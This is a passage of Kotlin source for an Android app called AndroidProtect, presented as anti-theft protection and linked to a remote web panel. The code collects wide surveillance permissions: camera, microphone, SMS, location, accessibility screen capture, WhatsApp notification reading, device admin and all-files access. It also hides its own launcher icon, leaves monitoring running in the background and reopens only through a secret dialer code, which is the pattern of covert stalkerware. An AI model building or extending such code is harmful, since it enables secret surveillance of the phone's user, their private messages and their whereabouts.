package com.androidprotect

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardActions
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.ui.text.input.ImeAction
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Visibility
import androidx.compose.material.icons.filled.VisibilityOff
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

private const val SERVER_HOST = "androidprotect.appbr.pro"

private enum class Screen { LOGIN, AUTH_GATE, SETUP, WIZARD }

class MainActivity : ComponentActivity() {

    private lateinit var mediaProjectionManager: MediaProjectionManager
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponent: ComponentName
    private val prefs by lazy { getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE) }

    private val hasLocationState         = mutableStateOf(false)
    private val hasBgLocationState       = mutableStateOf(false)
    private val hasCameraState           = mutableStateOf(false)
    private val hasMicState              = mutableStateOf(false)
    private val hasNotifyState           = mutableStateOf(false)
    private val hasScreenState           = mutableStateOf(false)
    private val hasAccessibilityState    = mutableStateOf(false)
    private val hasAdminState            = mutableStateOf(false)
    private val hasPhoneState            = mutableStateOf(false)
    private val hasSmsState              = mutableStateOf(false)
    private val hasActivityState         = mutableStateOf(false)
    private val hasWhatsAppListenerState = mutableStateOf(false)

    private val basicPermLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        refreshPermStates()
        if (hasPermission(Manifest.permission.ACCESS_FINE_LOCATION) &&
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
            !hasPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        ) {
            Handler(Looper.getMainLooper()).postDelayed({
                bgLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            }, 400)
        } else {
            scheduleScreenCaptureRequest()
        }
    }

    private val bgLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { granted ->
        hasBgLocationState.value = granted
        scheduleScreenCaptureRequest()
    }

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            AntiTheftService.mediaProjectionResultCode = result.resultCode
            AntiTheftService.mediaProjectionData = result.data
            prefs.edit().putBoolean("screen_perm_granted", true).apply()
            hasScreenState.value = true
        }
    }

    private val adminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { refreshPermStates() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        devicePolicyManager    = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent         = ComponentName(this, AdminReceiver::class.java)
        refreshPermStates()
        setContent { AndroidProtectTheme { AppRoot() } }
        if (savedInstanceState == null) startPermissionFlow()
    }

    override fun onResume() {
        super.onResume()
        refreshPermStates()
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        if (intent.getBooleanExtra("AUTO_SCREEN_PERM", false)) {
            refreshPermStates()
            if (prefs.getBoolean("screen_perm_granted", false) && AntiTheftService.mediaProjectionData == null) {
                screenCaptureLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())
            }
        }
    }

    // ── Root: decides which screen to show ───────────────────────────────────
    @Composable
    fun AppRoot() {
        val savedToken = prefs.getString("link_token", "") ?: ""
        val isLinked = savedToken.length == 9
        // Se já vinculado → sempre passa pelo portão de autenticação primeiro
        var screen by remember { mutableStateOf(if (isLinked) Screen.AUTH_GATE else Screen.LOGIN) }

        when (screen) {
            Screen.AUTH_GATE -> AuthGateScreen(onUnlocked = { screen = Screen.SETUP })
            Screen.LOGIN     -> LoginScreen(onLinked = {
                // Show wizard only the first time (wizard_done not set yet)
                screen = if (!prefs.getBoolean("wizard_done", false)) Screen.WIZARD else Screen.SETUP
            })
            Screen.WIZARD    -> WizardScreen(onDone = {
                prefs.edit().putBoolean("wizard_done", true).apply()
                screen = Screen.SETUP
            })
            Screen.SETUP     -> SetupScreen(onUnlink = {
                prefs.edit().remove("link_token").remove("user_email").apply()
                AntiTheftService.linkToken = ""
                stopService(Intent(this, AntiTheftService::class.java))
                screen = Screen.LOGIN
            })
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // AUTH GATE — proteção ao reabrir o app
    // ═══════════════════════════════════════════════════════════════════════
    @Composable
    fun AuthGateScreen(onUnlocked: () -> Unit) {
        val savedToken = prefs.getString("link_token", "") ?: ""
        val savedEmail = prefs.getString("user_email", "") ?: ""

        var input        by remember { mutableStateOf("") }
        var inputVisible by remember { mutableStateOf(false) }
        var errorMsg     by remember { mutableStateOf("") }
        var attempts     by remember { mutableStateOf(0) }
        val hasEmail     = savedEmail.isNotEmpty()

        fun tryUnlock() {
            val trimmed = input.trim()
            val ok = trimmed == savedToken ||
                     (hasEmail && trimmed.lowercase() == savedEmail)
            if (ok) {
                onUnlocked()
            } else {
                attempts++
                errorMsg = when {
                    attempts >= 5 -> "Muitas tentativas. Tente novamente."
                    else          -> "Código ou e-mail incorreto (${attempts}/5)."
                }
                input = ""
            }
        }

        Box(
            Modifier
                .fillMaxSize()
                .background(Color(0xFF0A0B10)),
            contentAlignment = Alignment.Center
        ) {
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(horizontal = 32.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                // Ícone / logo
                Text("🔐", fontSize = 52.sp)
                Spacer(Modifier.height(16.dp))
                Text(
                    "Protect",
                    color = Color.White,
                    fontSize = 26.sp,
                    fontWeight = FontWeight.Bold
                )
                Spacer(Modifier.height(6.dp))
                Text(
                    if (hasEmail)
                        "Digite o código do painel ou o e-mail da sua conta"
                    else
                        "Digite o código do painel para continuar",
                    color = Color(0xFF8E94A5),
                    fontSize = 13.sp,
                    lineHeight = 18.sp,
                    textAlign = TextAlign.Center
                )
                Spacer(Modifier.height(28.dp))

                OutlinedTextField(
                    value = input,
                    onValueChange = { input = it; errorMsg = "" },
                    placeholder = {
                        Text(
                            if (hasEmail) "Código ou e-mail" else "Código do painel",
                            color = Color(0xFF555870)
                        )
                    },
                    singleLine = true,
                    visualTransformation = if (inputVisible)
                        androidx.compose.ui.text.input.VisualTransformation.None
                    else
                        androidx.compose.ui.text.input.PasswordVisualTransformation(),
                    keyboardOptions = KeyboardOptions(
                        imeAction = ImeAction.Done,
                        keyboardType = KeyboardType.Text
                    ),
                    keyboardActions = KeyboardActions(onDone = { tryUnlock() }),
                    trailingIcon = {
                        IconButton(onClick = { inputVisible = !inputVisible }) {
                            Icon(
                                if (inputVisible) Icons.Filled.VisibilityOff
                                else Icons.Filled.Visibility,
                                contentDescription = null,
                                tint = Color(0xFF555870)
                            )
                        }
                    },
                    modifier = Modifier.fillMaxWidth(),
                    colors = neonOutlinedColors(),
                    shape = RoundedCornerShape(14.dp)
                )

                if (errorMsg.isNotEmpty()) {
                    Spacer(Modifier.height(8.dp))
                    Text(errorMsg, color = Color(0xFFFF3838), fontSize = 12.sp)
                }

                Spacer(Modifier.height(18.dp))

                Button(
                    onClick = { tryUnlock() },
                    modifier = Modifier.fillMaxWidth().height(52.dp),
                    shape = RoundedCornerShape(14.dp),
                    enabled = input.isNotBlank(),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
                ) {
                    Text(
                        "Confirmar",
                        color = Color(0xFF0A0B10),
                        fontWeight = FontWeight.Bold,
                        fontSize = 16.sp
                    )
                }
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // LOGIN SCREEN
    // ═══════════════════════════════════════════════════════════════════════
    @Composable
    fun LoginScreen(onLinked: () -> Unit) {
        var selectedTab     by remember { mutableStateOf(0) }

        // Conta tab
        var email           by remember { mutableStateOf("") }
        var password        by remember { mutableStateOf("") }
        var passwordVisible by remember { mutableStateOf(false) }
        var loginLoading    by remember { mutableStateOf(false) }
        var loginError      by remember { mutableStateOf("") }

        // Código tab
        var codeInput  by remember { mutableStateOf("") }
        var wsConnected by remember { mutableStateOf(AntiTheftService.isWebSocketConnected) }

        val scope = rememberCoroutineScope()

        LaunchedEffect(Unit) {
            while (true) {
                wsConnected = AntiTheftService.isWebSocketConnected
                delay(2000)
            }
        }

        Column(
            modifier = Modifier
                .fillMaxSize()
                .background(Color(0xFF0A0B10))
                .verticalScroll(rememberScrollState())
                .padding(horizontal = 28.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Spacer(Modifier.height(72.dp))

            // Shield logo
            Box(
                Modifier
                    .size(88.dp)
                    .background(Color(0xFF0D1826), RoundedCornerShape(26.dp))
                    .border(1.5.dp, Color(0xFF00D2FF).copy(alpha = 0.35f), RoundedCornerShape(26.dp)),
                Alignment.Center
            ) {
                Text("🛡️", fontSize = 42.sp)
            }

            Spacer(Modifier.height(18.dp))
            Text("AndroidProtect", fontSize = 30.sp, fontWeight = FontWeight.Bold, color = Color(0xFF00D2FF))
            Text(
                "Proteção inteligente para seu Android",
                color = Color(0xFF8E94A5), fontSize = 13.sp,
                textAlign = TextAlign.Center,
                modifier = Modifier.padding(top = 6.dp, bottom = 32.dp)
            )

            // Card
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .border(1.dp, Color(0xFF252630), RoundedCornerShape(20.dp)),
                colors = CardDefaults.cardColors(containerColor = Color(0xFF12141D)),
                shape = RoundedCornerShape(20.dp)
            ) {
                Column(Modifier.padding(20.dp)) {

                    // Tab switcher
                    Row(
                        Modifier
                            .fillMaxWidth()
                            .background(Color(0xFF0A0B10), RoundedCornerShape(12.dp))
                            .padding(4.dp)
                    ) {
                        listOf("Minha Conta", "Código Direto").forEachIndexed { idx, label ->
                            val active = selectedTab == idx
                            Box(
                                Modifier
                                    .weight(1f)
                                    .background(
                                        if (active) Color(0xFF00D2FF) else Color.Transparent,
                                        RoundedCornerShape(9.dp)
                                    )
                                    .clickable { selectedTab = idx; loginError = "" }
                                    .padding(vertical = 11.dp),
                                Alignment.Center
                            ) {
                                Text(
                                    label,
                                    color = if (active) Color(0xFF0A0B10) else Color(0xFF8E94A5),
                                    fontWeight = if (active) FontWeight.Bold else FontWeight.Normal,
                                    fontSize = 13.sp
                                )
                            }
                        }
                    }

                    Spacer(Modifier.height(22.dp))

                    if (selectedTab == 0) {
                        // ── EMAIL / SENHA ──────────────────────────────────
                        OutlinedTextField(
                            value = email,
                            onValueChange = { email = it; loginError = "" },
                            label = { Text("E-mail") },
                            modifier = Modifier.fillMaxWidth(),
                            singleLine = true,
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Email),
                            colors = neonOutlinedColors()
                        )
                        Spacer(Modifier.height(12.dp))
                        OutlinedTextField(
                            value = password,
                            onValueChange = { password = it; loginError = "" },
                            label = { Text("Senha") },
                            modifier = Modifier.fillMaxWidth(),
                            singleLine = true,
                            visualTransformation = if (passwordVisible) VisualTransformation.None
                                                   else PasswordVisualTransformation(),
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password),
                            trailingIcon = {
                                IconButton(onClick = { passwordVisible = !passwordVisible }) {
                                    Icon(
                                        if (passwordVisible) Icons.Default.VisibilityOff
                                        else Icons.Default.Visibility,
                                        contentDescription = null,
                                        tint = Color(0xFF8E94A5)
                                    )
                                }
                            },
                            colors = neonOutlinedColors()
                        )

                        if (loginError.isNotEmpty()) {
                            Spacer(Modifier.height(10.dp))
                            Text(loginError, color = Color(0xFFFF3838), fontSize = 12.sp)
                        }

                        Spacer(Modifier.height(18.dp))
                        Button(
                            onClick = {
                                loginError = ""
                                if (email.isBlank() || password.isBlank()) {
                                    loginError = "Preencha e-mail e senha."
                                    return@Button
                                }
                                loginLoading = true
                                scope.launch(Dispatchers.IO) {
                                    try {
                                        val url = URL("https://$SERVER_HOST/api/auth/login")
                                        val conn = url.openConnection() as HttpURLConnection
                                        conn.requestMethod = "POST"
                                        conn.setRequestProperty("Content-Type", "application/json")
                                        conn.doOutput = true
                                        conn.connectTimeout = 10_000
                                        conn.readTimeout   = 10_000
                                        val body = JSONObject().apply {
                                            put("email", email.trim().lowercase())
                                            put("password", password)
                                        }.toString()
                                        OutputStreamWriter(conn.outputStream).use { it.write(body) }

                                        val code = conn.responseCode
                                        val resp = (if (code == 200) conn.inputStream else conn.errorStream)
                                            ?.bufferedReader()?.readText() ?: ""

                                        withContext(Dispatchers.Main) {
                                            loginLoading = false
                                            if (code == 200) {
                                                val json = JSONObject(resp)
                                                val token = json.getJSONObject("user").getString("linkToken")
                                                prefs.edit()
                                                    .putString("link_token", token)
                                                    .putString("user_email", email.trim().lowercase())
                                                    .putString("server_ip", SERVER_HOST)
                                                    .putBoolean("auto_start", true)
                                                    .apply()
                                                AntiTheftService.linkToken = token
                                                AntiTheftService.serverIpAddress = SERVER_HOST
                                                launchService()
                                                onLinked()
                                            } else {
                                                val json = runCatching { JSONObject(resp) }.getOrNull()
                                                loginError = json?.optString("error") ?: "Credenciais inválidas."
                                            }
                                        }
                                    } catch (e: Exception) {
                                        withContext(Dispatchers.Main) {
                                            loginLoading = false
                                            loginError = "Sem conexão com o servidor."
                                        }
                                    }
                                }
                            },
                            modifier = Modifier.fillMaxWidth().height(52.dp),
                            shape = RoundedCornerShape(14.dp),
                            enabled = !loginLoading,
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
                        ) {
                            if (loginLoading)
                                CircularProgressIndicator(
                                    modifier = Modifier.size(22.dp),
                                    color = Color(0xFF0A0B10),
                                    strokeWidth = 2.5.dp
                                )
                            else
                                Text("Entrar", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 16.sp)
                        }

                    } else {
                        // ── CÓDIGO DIRETO ──────────────────────────────────
                        Text(
                            "Digite o código de 9 caracteres exibido no seu painel em androidprotect.appbr.pro",
                            color = Color(0xFF8E94A5), fontSize = 12.sp, lineHeight = 17.sp,
                            textAlign = TextAlign.Center,
                            modifier = Modifier.padding(bottom = 18.dp)
                        )

                        OutlinedTextField(
                            value = codeInput,
                            onValueChange = { v ->
                                val clean = v.uppercase().replace("[^A-Z0-9-]".toRegex(), "").take(9)
                                codeInput = clean
                                AntiTheftService.linkToken = clean
                                prefs.edit()
                                    .putString("link_token", clean)
                                    .putString("server_ip", SERVER_HOST)
                                    .putBoolean("auto_start", true)
                                    .apply()
                                if (clean.length == 9) {
                                    AntiTheftService.serverIpAddress = SERVER_HOST
                                    launchService()
                                }
                            },
                            label = { Text("Código do painel") },
                            placeholder = { Text("XXXX-XXXX") },
                            modifier = Modifier.fillMaxWidth(),
                            singleLine = true,
                            colors = OutlinedTextFieldDefaults.colors(
                                focusedBorderColor = Color(0xFF00D2FF),
                                unfocusedBorderColor = when {
                                    wsConnected && codeInput.length == 9 -> Color(0xFF39FF14)
                                    codeInput.length == 9 -> Color(0xFFFF9900)
                                    else -> Color(0xFF252630)
                                },
                                focusedLabelColor = Color(0xFF00D2FF),
                                cursorColor = Color(0xFF00D2FF),
                                focusedTextColor = Color.White,
                                unfocusedTextColor = Color.White
                            )
                        )

                        Spacer(Modifier.height(14.dp))

                        when {
                            codeInput.length == 9 && wsConnected -> {
                                Row(verticalAlignment = Alignment.CenterVertically) {
                                    Icon(Icons.Default.CheckCircle, null, tint = Color(0xFF39FF14), modifier = Modifier.size(16.dp))
                                    Spacer(Modifier.width(7.dp))
                                    Text("Aparelho vinculado!", color = Color(0xFF39FF14), fontSize = 12.sp, fontWeight = FontWeight.SemiBold)
                                }
                                Spacer(Modifier.height(14.dp))
                                Button(
                                    onClick = { onLinked() },
                                    modifier = Modifier.fillMaxWidth().height(52.dp),
                                    shape = RoundedCornerShape(14.dp),
                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF39FF14))
                                ) {
                                    Text("Continuar →", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 16.sp)
                                }
                            }
                            codeInput.length == 9 -> {
                                Row(verticalAlignment = Alignment.CenterVertically) {
                                    CircularProgressIndicator(modifier = Modifier.size(14.dp), color = Color(0xFFFF9900), strokeWidth = 2.dp)
                                    Spacer(Modifier.width(8.dp))
                                    Text("Conectando ao painel...", color = Color(0xFFFF9900), fontSize = 12.sp)
                                }
                            }
                            codeInput.isNotEmpty() -> {
                                Text("${codeInput.length}/9 caracteres", color = Color(0xFF8E94A5), fontSize = 11.sp)
                            }
                        }
                    }
                }
            }

            Spacer(Modifier.height(40.dp))
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // SETUP SCREEN
    // ═══════════════════════════════════════════════════════════════════════
    @Composable
    fun SetupScreen(onUnlink: () -> Unit) {
        val context = this

        var wsConnected    by remember { mutableStateOf(AntiTheftService.isWebSocketConnected) }
        var isServiceActive by remember { mutableStateOf(AntiTheftService.isServiceRunning) }
        val defaultHwName  = "${Build.MANUFACTURER} ${Build.MODEL}"
        var deviceName     by remember { mutableStateOf(prefs.getString("device_custom_name", "") ?: "") }
        var showHideDialog  by remember { mutableStateOf(false) }
        var showUnlinkDialog by remember { mutableStateOf(false) }

        val hasLocation        by hasLocationState
        val hasBgLocation      by hasBgLocationState
        val hasCamera          by hasCameraState
        val hasMic             by hasMicState
        val hasNotify          by hasNotifyState
        val hasScreen          by hasScreenState
        val hasAccessibility   by hasAccessibilityState
        val hasAdmin           by hasAdminState
        val hasPhone           by hasPhoneState
        val hasSms             by hasSmsState
        val hasActivity        by hasActivityState
        val hasWhatsAppListener by hasWhatsAppListenerState
        val hasAllFiles = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
            android.os.Environment.isExternalStorageManager() else true
        val isBatteryOptimized = isBatteryOptimizedFor(context)

        val allGranted = hasLocation && hasBgLocation && hasCamera && hasMic &&
                hasPhone && hasSms && hasActivity && hasNotify && hasAccessibility &&
                hasAdmin && hasWhatsAppListener && hasAllFiles && !isBatteryOptimized

        LaunchedEffect(Unit) {
            AntiTheftService.serverIpAddress = SERVER_HOST
            AntiTheftService.linkToken = prefs.getString("link_token", "") ?: ""
            if (prefs.getBoolean("auto_start", true) && !AntiTheftService.isServiceRunning) {
                launchService(); isServiceActive = true
            }
        }

        LaunchedEffect(Unit) {
            while (true) {
                wsConnected = AntiTheftService.isWebSocketConnected
                if (!AntiTheftService.isServiceRunning && isServiceActive) isServiceActive = false
                delay(2000)
            }
        }

        // ── Dialogs ────────────────────────────────────────────────────────
        if (showHideDialog) {
            val missingCount = listOf(
                hasLocation, hasBgLocation, hasCamera, hasMic, hasPhone, hasSms,
                hasActivity, hasNotify, hasAccessibility, hasAdmin, hasWhatsAppListener, hasAllFiles
            ).count { !it }
            val dialogBody = buildString {
                append("O ícone será removido da gaveta de aplicativos. O monitoramento continua ativo em segundo plano.")
                if (missingCount > 0)
                    append("\n\n⚠️ $missingCount permissão(ões) ainda pendente(s). O monitoramento pode ser limitado.")
                else if (isBatteryOptimized)
                    append("\n\n⚠️ Otimização de bateria ativa — o serviço pode ser suspenso pelo sistema.")
                append("\n\nPara reabrir: *#*#7777#*#*")
            }
            AlertDialog(
                onDismissRequest = { showHideDialog = false },
                containerColor = Color(0xFF12141D),
                title = { Text("Ocultar aplicativo?", color = Color.White, fontWeight = FontWeight.Bold) },
                text = {
                    Text(dialogBody, color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 19.sp)
                },
                confirmButton = {
                    Button(
                        onClick = {
                            showHideDialog = false
                            // Desativa o componente launcher — funciona em todos os OEMs e versões Android
                            packageManager.setComponentEnabledSetting(
                                ComponentName(context, MainActivity::class.java),
                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                PackageManager.DONT_KILL_APP
                            )
                            finish()
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF3838))
                    ) { Text("Ocultar agora", color = Color.White, fontWeight = FontWeight.Bold) }
                },
                dismissButton = {
                    OutlinedButton(onClick = { showHideDialog = false },
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFF8E94A5))
                    ) { Text("Cancelar") }
                }
            )
        }

        if (showUnlinkDialog) {
            AlertDialog(
                onDismissRequest = { showUnlinkDialog = false },
                containerColor = Color(0xFF12141D),
                title = { Text("Desvincular aparelho?", color = Color.White, fontWeight = FontWeight.Bold) },
                text = {
                    Text(
                        "O aparelho será desconectado do painel e o serviço de monitoramento será encerrado.",
                        color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 19.sp
                    )
                },
                confirmButton = {
                    Button(
                        onClick = { showUnlinkDialog = false; onUnlink() },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF3838))
                    ) { Text("Desvincular", color = Color.White, fontWeight = FontWeight.Bold) }
                },
                dismissButton = {
                    OutlinedButton(onClick = { showUnlinkDialog = false },
                        colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFF8E94A5))
                    ) { Text("Cancelar") }
                }
            )
        }

        Column(
            modifier = Modifier
                .fillMaxSize()
                .background(Color(0xFF0A0B10))
                .verticalScroll(rememberScrollState())
                .padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Spacer(Modifier.height(20.dp))

            // ── Header ─────────────────────────────────────────────────────
            Row(Modifier.fillMaxWidth(), Arrangement.SpaceBetween, Alignment.CenterVertically) {
                Column {
                    Text("AndroidProtect", fontSize = 24.sp, fontWeight = FontWeight.Bold, color = Color(0xFF00D2FF))
                    Text("Painel de Configuração", color = Color(0xFF8E94A5), fontSize = 13.sp)
                }
                Column(horizontalAlignment = Alignment.End, verticalArrangement = Arrangement.spacedBy(6.dp)) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Box(
                            Modifier.size(8.dp).background(
                                if (wsConnected) Color(0xFF39FF14) else Color(0xFFFF3838),
                                CircleShape
                            )
                        )
                        Spacer(Modifier.width(5.dp))
                        Text(
                            if (wsConnected) "Conectado" else "Desconectado",
                            color = if (wsConnected) Color(0xFF39FF14) else Color(0xFFFF3838),
                            fontSize = 11.sp, fontWeight = FontWeight.SemiBold
                        )
                    }
                    StatusBadge(isServiceActive)
                }
            }

            Spacer(Modifier.height(22.dp))

            // ── Nome do dispositivo ────────────────────────────────────────
            SectionCard {
                Label("NOME DO DISPOSITIVO")
                Spacer(Modifier.height(8.dp))
                Text(
                    "Dê um nome para identificar este celular no painel.",
                    color = Color(0xFF8E94A5), fontSize = 11.sp, lineHeight = 15.sp,
                    modifier = Modifier.padding(bottom = 12.dp)
                )
                OutlinedTextField(
                    value = deviceName,
                    onValueChange = { deviceName = it },
                    label = { Text("Nome personalizado (opcional)") },
                    placeholder = { Text(defaultHwName) },
                    modifier = Modifier.fillMaxWidth(),
                    singleLine = true,
                    colors = neonOutlinedColors()
                )
                Spacer(Modifier.height(10.dp))
                Button(
                    onClick = {
                        val trimmed = deviceName.trim()
                        prefs.edit().putString("device_custom_name", trimmed).apply()
                        AntiTheftService.currentModelName = trimmed.ifEmpty { defaultHwName }
                        val intent = Intent(context, AntiTheftService::class.java)
                            .putExtra("DEVICE_NAME", AntiTheftService.currentModelName)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent)
                        else context.startService(intent)
                        Toast.makeText(
                            context,
                            if (trimmed.isEmpty()) "Nome redefinido para padrão." else "Nome salvo!",
                            Toast.LENGTH_SHORT
                        ).show()
                    },
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
                ) {
                    Text(
                        if (deviceName.trim().isEmpty()) "Usar nome padrão" else "Salvar Nome",
                        color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold
                    )
                }
            }

            // ── Permissões ─────────────────────────────────────────────────
            SectionCard {
                Label("CENTRAL DE PERMISSÕES")
                Spacer(Modifier.height(4.dp))
                Text(
                    "Todas as permissões são necessárias para o funcionamento completo.",
                    color = Color(0xFF8E94A5), fontSize = 11.sp, lineHeight = 15.sp,
                    modifier = Modifier.padding(bottom = 14.dp)
                )

                PermRow("GPS (Localização)", hasLocation)
                PermRow("Localização em Segundo Plano", hasBgLocation)
                PermRow("Câmera", hasCamera)
                PermRow("Microfone / Áudio", hasMic)
                PermRow("Estado do Telefone (IMEI/SIM)", hasPhone)
                PermRow("Receber SMS (backup sem internet)", hasSms)
                PermRow("Reconhecimento de Movimento", hasActivity)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) PermRow("Notificações", hasNotify)
                PermRow(
                    if (hasAccessibility) "Captura de Tela Permanente ✓" else "Captura de Tela (Acessibilidade)",
                    hasAccessibility
                )
                PermRow(
                    if (hasWhatsAppListener) "Monitor WhatsApp ✓" else "Monitor WhatsApp (notificações)",
                    hasWhatsAppListener
                )
                if (!hasAccessibility) PermRow("Transmissão de Tela (temporária)", hasScreen)
                PermRow("Administrador do Dispositivo", hasAdmin)
                PermRow("Acesso a Todos os Arquivos", hasAllFiles)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                    PermRow("Sem otimização de bateria", !isBatteryOptimized)

                Spacer(Modifier.height(14.dp))

                if (!allGranted) {
                    if (isBatteryOptimized && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        Button(
                            onClick = {
                                // Usa intent específico por fabricante:
                                // • Xiaomi/MIUI/HyperOS → HoldingActivity (seletor "Sem restrições")
                                // • Outros → diálogo ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                                val ok = runCatching {
                                    startActivity(batteryOptimizationIntent())
                                }.isSuccess
                                if (!ok) runCatching {
                                    startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
                                }
                            },
                            modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF39FF14))
                        ) {
                            Text("⚡  Desativar Otimização de Bateria", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 12.sp)
                        }
                        val batteryHint = run {
                            val mfr = Build.MANUFACTURER.lowercase()
                            val br  = Build.BRAND.lowercase()
                            when {
                                "xiaomi" in mfr || "redmi" in br || "poco" in br ->
                                    "Na tela que abrir, toque em \"Economia de bateria\" → selecione \"Sem restrições\"."
                                "huawei" in mfr || "honor" in br ->
                                    "Ative \"App protegido\" ou selecione \"Sem restrições\"."
                                else ->
                                    "Confirme \"Permitir\" no diálogo que aparecer."
                            }
                        }
                        Text(
                            batteryHint,
                            color = Color(0xFF8E94A5), fontSize = 10.sp, lineHeight = 14.sp,
                            modifier = Modifier.padding(bottom = 10.dp)
                        )
                    }

                    if (!hasAccessibility) {
                        Button(
                            onClick = { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
                            modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF7C3AED))
                        ) {
                            Text("♿  Ativar Captura de Tela Permanente", color = Color.White, fontWeight = FontWeight.Bold, fontSize = 12.sp)
                        }
                        Text(
                            "Configurações → Acessibilidade → Protect → Ativar.",
                            color = Color(0xFF8E94A5), fontSize = 10.sp, lineHeight = 14.sp,
                            modifier = Modifier.padding(bottom = 10.dp)
                        )
                    }

                    if (!hasWhatsAppListener) {
                        Button(
                            onClick = { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) },
                            modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF25D366))
                        ) {
                            Text("💬  Permitir Ler Notificações do WhatsApp", color = Color.Black, fontWeight = FontWeight.Bold, fontSize = 12.sp)
                        }
                        Text(
                            "Configurações → Acesso às notificações → Protect → Ativar.",
                            color = Color(0xFF8E94A5), fontSize = 10.sp, lineHeight = 14.sp,
                            modifier = Modifier.padding(bottom = 10.dp)
                        )
                    }

                    if (!hasAllFiles && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                        Button(
                            onClick = { startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)) },
                            modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
                            shape = RoundedCornerShape(12.dp),
